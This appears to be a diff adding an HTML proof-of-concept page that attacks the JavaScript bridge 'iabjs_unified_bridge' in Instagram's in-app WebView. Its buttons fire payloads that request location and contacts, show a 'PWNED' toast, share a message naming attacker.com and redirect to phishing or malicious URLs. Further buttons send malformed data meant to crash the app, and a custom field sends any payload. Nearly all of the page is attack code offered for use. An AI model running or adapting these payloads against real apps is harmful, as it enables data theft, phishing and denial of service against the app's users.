@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bridge Injection PoC: Real World Impact</title>
+    <style>
+        body { font-family: 'Segoe UI', sans-serif; background: #0d1117; color: #c9d1d9; padding: 20px; }
+        .card { background: #161b22; border: 1px solid #30363d; border-radius: 8px; padding: 15px; margin-bottom: 20px; border-left: 4px solid #f85149; }
+        h2 { color: #f85149; text-align: center; border-bottom: 1px solid #30363d; padding-bottom: 10px; }
+        h3 { color: #58a6ff; margin-top: 0; }
+        .btn { display: inline-block; background: #21262d; color: #58a6ff; padding: 10px 15px; border: 1px solid #30363d; border-radius: 6px; margin: 5px 2px; cursor: pointer; font-weight: bold; }
+        .btn-danger { background: #d32f2f; color: white; border-color: #f85149; }
+        .result-box { background: #010409; color: #7ee787; padding: 10px; border-radius: 6px; font-family: monospace; margin-top: 10px; border: 1px solid #30363d; min-height: 80px; word-break: break-all; }
+        input[type="text"] { width: calc(100% - 22px); padding: 8px; margin-bottom: 10px; background: #21262d; border: 1px solid #30363d; color: #c9d1d9; border-radius: 4px; }
+    </style>
+</head>
+<body>
+
+    <h2>Bridge Injection PoC: Real-World Impact</h2>
+    <p>Targeting <code>iabjs_unified_bridge.postMessage</code> in Instagram's WebView</p>
+
+    <div class="card">
+        <h3>1. Test Bridge Access</h3>
+        <p>Verify <code>iabjs_unified_bridge</code> is available.</p>
+        <button class="btn" onclick="checkBridge()">Check Bridge Availability</button>
+        <div id="check-res" class="result-box"></div>
+    </div>
+
+    <div class="card">
+        <h3>2. Location Access / Data Leakage</h3>
+        <p>Attempt to request user's location via bridge.</p>
+        <button class="btn btn-danger" onclick="sendPayload('{"action":"getLocation"}')">Request Location</button>
+        <button class="btn btn-danger" onclick="sendPayload('{"action":"getData","type":"contacts"}')">Request Contacts</button>
+    </div>
+
+    <div class="card">
+        <h3>3. UI / System Manipulation</h3>
+        <p>Try to manipulate app UI or system features (e.g., Toast, Settings).</p>
+        <button class="btn" onclick="sendPayload('{"action":"showToast","message":"PWNED_by_Bridge!"}')">Show Toast Message</button>
+        <button class="btn" onclick="sendPayload('{"action":"openSettings","screen":"privacy"}')">Open Privacy Settings</button>
+        <button class="btn" onclick="sendPayload('{"action":"share","text":"I am being controlled by an attacker: https://attacker.com"}')">Share Message</button>
+    </div>
+
+    <div class="card">
+        <h3>4. URL Redirection / Phishing Attack</h3>
+        <p>Attempt to force internal WebView redirection.</p>
+        <button class="btn" onclick="sendPayload('{"action":"openUrl","url":"https://phishing-site.com/insta-login"}')">Open Phishing URL</button>
+        <button class="btn" onclick="sendPayload('{"action":"redirect","to":"https://malicious-site.com"}')">Redirect WebView</button>
+    </div>
+
+    <div class="card">
+        <h3>5. DoS / App Crash</h3>
+        <p>Send malformed data to crash the app.</p>
+        <button class="btn btn-danger" onclick="sendPayload('{}')">Empty JSON</button>
+        <button class="btn btn-danger" onclick="sendPayload('null')">Null Payload</button>
+        <button class="btn btn-danger" onclick="sendPayload('undefined')">Undefined Payload</button>
+        <button class="btn btn-danger" onclick="sendPayload('{"a":[]}["a"]["a"]["a"]["a"]')">Stack Overflow JSON</button>
+    </div>
+
+    <div class="card">
+        <h3>Custom Payload Sender</h3>
+        <input type="text" id="customPayload" placeholder='{"action":"customAction","data":"..."}'>
+        <button class="btn" onclick="sendCustomPayload()">Send Custom Payload</button>
+        <div id="custom-res" class="result-box"></div>
+    </div>
+
+    <script>
+        const bridgeName = 'iabjs_unified_bridge';
+
+        function checkBridge() {
+            const res = document.getElementById('check-res');
+            if (window[bridgeName] && typeof window[bridgeName].postMessage === 'function') {
+                res.innerText = `SUCCESS: Bridge '${bridgeName}' found and 'postMessage' method is available.`;
+            } else {
+                res.innerText = `ERROR: Bridge '${bridgeName}' or 'postMessage' method not found.`;
+            }
+        }
+
+        function sendPayload(payload) {
+            const resBox = document.getElementById('check-res');
+            try {
+                if (window[bridgeName] && typeof window[bridgeName].postMessage === 'function') {
+                    // Try to parse if it's a JSON string, else send as is
+                    try {
+                        let parsedPayload = JSON.parse(payload);
+                        window[bridgeName].postMessage(parsedPayload);
+                    } catch (e) {
+                        window[bridgeName].postMessage(payload);
+                    }
+                    resBox.innerText = `Payload sent to bridge: ${payload}`;
+                    console.log('Payload sent:', payload);
+                } else {
+                    resBox.innerText = `ERROR: Bridge '${bridgeName}' not available.`;
+                }
+            } catch (e) {
+                resBox.innerText = `ERROR sending payload: ${e.message}. Check console for details.`;
+                console.error('Bridge Injection Error:', e);
+            }
+        }
+
+        function sendCustomPayload() {
+            const customPayload = document.getElementById('customPayload').value;
+            sendPayload(customPayload);
+            document.getElementById('custom-res').innerText = `Custom Payload Sent: ${customPayload}`;
+        }
+    </script>
+</body>
+</html>
